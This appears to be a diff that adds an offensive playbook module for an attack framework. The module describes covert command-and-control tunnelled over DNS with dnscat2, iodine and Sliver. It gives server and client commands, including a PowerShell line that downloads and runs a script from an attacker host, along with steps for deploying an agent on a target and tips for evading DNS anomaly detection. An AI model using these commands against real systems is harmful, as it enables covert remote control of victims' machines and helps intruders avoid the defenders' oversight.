@@ -1,0 +1,51 @@
+---
+name: dns-c2
+phase: c2
+mitre_ids: [T1071.004, T1568.002]
+opsec_level: 4
+description: Establish a covert C2 channel over DNS queries to bypass network egress controls
+module: phantom-c2
+tools: [iodine, dnscat2, sliver]
+prerequisites: [controlled_dns_domain, dns_server_access]
+---
+# DNS-Based C2 Channel
+
+## Technique
+Tunnel C2 traffic through DNS queries and responses to bypass firewalls that
+block direct TCP/UDP connections but allow DNS resolution.  Effective in
+highly restricted network environments.
+
+## Commands
+```bash
+# dnscat2 server (attacker side)
+ruby dnscat2.rb --dns "domain=c2.attacker.com,host=0.0.0.0" --no-cache
+
+# dnscat2 client (target side — PowerShell)
+# Download and run the PowerShell client
+IEX (New-Object Net.WebClient).DownloadString('https://attacker.com/dnscat.ps1')
+Start-Dnscat2 -Domain c2.attacker.com -DNSServer 8.8.8.8
+
+# iodine DNS tunnel (for full IP-over-DNS)
+# Server:
+iodined -f -c -P password 10.0.0.1 tunnel.attacker.com
+# Client:
+iodine -f -P password tunnel.attacker.com
+
+# Sliver DNS listener
+dns --domains c2.attacker.com
+```
+
+## Usage
+1. Register a domain and configure NS records to point to your DNS server.
+2. Start the C2 server with DNS listener.
+3. Deploy the client-side agent on the target.
+4. Interact via the DNS tunnel — expect higher latency than TCP.
+
+## Detection Evasion
+- Use legitimate-looking subdomain patterns (e.g., update.cdn.attacker.com).
+- Keep query frequency low to avoid DNS anomaly detection.
+- Use TXT and CNAME record types in addition to A records to vary traffic.
+
+## MITRE ATT&CK
+- T1071.004 — Application Layer Protocol: DNS
+- T1568.002 — Dynamic Resolution: Domain Generation Algorithms
